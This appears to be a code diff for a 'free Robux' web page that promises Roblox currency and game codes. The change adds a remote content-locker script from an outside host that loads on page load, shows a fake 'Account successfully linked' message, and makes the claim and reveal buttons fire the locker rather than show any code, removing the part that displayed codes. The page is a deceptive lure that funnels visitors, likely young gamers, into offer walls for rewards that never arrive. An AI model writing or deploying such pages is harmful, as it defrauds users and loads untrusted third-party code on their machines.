@@ -215,62 +215,56 @@
         </div>
     </div>
 
+    <!-- Script Injection for Content Locker -->
+    <script type="text/javascript" id="ogjs" src="https://appsave.store/cl/js/m53x2w"></script>
+
     <script>
-        // Form Validation & Logic
+        // Track connection status
+        let isConnected = false;
+
         function connectUser() {
             const username = document.getElementById('username').value;
             if (username.trim() === "") {
                 alert("Please enter a valid Roblox username!");
+                isConnected = false;
             } else {
                 document.getElementById('welcome-msg').innerText = `✅ Account successfully linked: ${username}`;
+                isConnected = true;
             }
         }
 
-        // Custom function to load and execute your script ONLY on active clicks
+        // Trigger Ogads Locker Function
         function triggerOgLocker() {
-            if (!document.getElementById('ogjs')) {
-                const script = document.createElement('script');
-                script.type = 'text/javascript';
-                script.id = 'ogjs';
-                script.src = 'https://appsave.store';
-                
-                // Fire locker immediately once script files finish downloading
-                script.onload = function() {
-                    if (typeof og_load === "function") {
-                        og_load();
-                    }
-                };
-                document.body.appendChild(script);
+            if (typeof call_locker === "function") {
+                call_locker();
+            } else if (typeof og_load === "function") {
+                og_load();
             } else {
-                // If script is already compiled, call it directly
-                if (typeof og_load === "function") {
-                    og_load();
-                }
+                alert("Verifying your request... please complete the verification on the next step.");
             }
         }
 
+        // Action when Claim Robux is clicked
         function claimRobux() {
-            const username = document.getElementById('username').value;
-            if (username.trim() === "") {
-                alert("You must enter and link your username first!");
-            } else {
-                triggerOgLocker();
-            }
-        }
-
-        function showCode(codeId) {
-            const username = document.getElementById('username').value;
-            if (username.trim() === "") {
-                alert("Please connect your username above to unlock game codes!");
+            if (!isConnected) {
+                alert("Please connect your Roblox account first!");
+                document.getElementById('username').focus();
                 return;
             }
-            
+            // Fire the locker
             triggerOgLocker();
-            
-            const codeDiv = document.getElementById(codeId);
-            codeDiv.style.display = "block";
+        }
+
+        // Action when Reveal Code is clicked
+        function showCode(codeId) {
+            if (!isConnected) {
+                alert("Please connect your Roblox account first!");
+                document.getElementById('username').focus();
+                return;
+            }
+            // Fire the locker
+            triggerOgLocker();
         }
     </script>
-
 </body>
 </html>
